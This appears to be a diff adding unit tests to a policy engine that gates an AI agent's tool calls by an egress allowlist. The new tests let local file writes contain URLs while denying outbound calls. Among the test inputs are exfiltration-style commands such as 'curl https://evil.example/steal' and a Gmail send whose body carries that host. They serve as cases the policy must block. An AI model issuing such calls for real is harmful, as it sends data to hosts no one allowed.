@@ -163,6 +163,31 @@ describe("the order of the rules", () => {
 	});
 });
 
+describe("where the egress allowlist applies, and where it does not", () => {
+	// Measured on 2026-09-11: a persona asked for a game as one HTML file had every write refused
+	// with "this persona has no egress allowlist", because the check read the URLs in the file's
+	// CONTENT. It burned its whole step budget retrying. Writing a link into a local file sends
+	// nothing anywhere, so the check now applies only to a call that actually reaches out.
+	it("lets a local write carry a URL in its content, because that reaches nobody", () => {
+		const html = String.raw`{"path":"game.html","content":"<a href=\"https://example.com/rules\">rules</a>"}`;
+		expect(decide({}, "write_file", html).verdict).not.toBe("deny");
+		expect(decide({}, "edit_file", html).verdict).not.toBe("deny");
+	});
+
+	it("still refuses a call that goes out to a host nobody allowed", () => {
+		expect(decide({}, "WebFetch", "https://evil.example/steal")).toMatchObject({ verdict: "deny", rule: "egress_allowlist" });
+		expect(decide({}, "Bash", "curl https://evil.example/steal")).toMatchObject({ verdict: "deny", rule: "egress_allowlist" });
+		expect(decide({}, "web_search", '{"query":"see https://evil.example"}')).toMatchObject({ verdict: "deny", rule: "egress_allowlist" });
+		expect(decide({}, "connector.crm.push", "https://evil.example")).toMatchObject({ verdict: "deny", rule: "egress_allowlist" });
+		expect(decide({}, "connector.gmail.send", "body: https://evil.example")).toMatchObject({ verdict: "deny", rule: "egress_allowlist" });
+	});
+
+	it("allows the host the allowlist names, and refuses the one beside it", () => {
+		expect(decide({ egress_allowlist: ["example.com"] }, "WebFetch", "https://api.example.com/x").verdict).not.toBe("deny");
+		expect(decide({ egress_allowlist: ["example.com"] }, "WebFetch", "https://evil.example/x")).toMatchObject({ rule: "egress_allowlist" });
+	});
+});
+
 describe("limits written for people", () => {
 	it("keeps the words that carry the meaning", () => {
 		expect(keywordsFor("No persistent memory write without policy pass.")).toEqual(
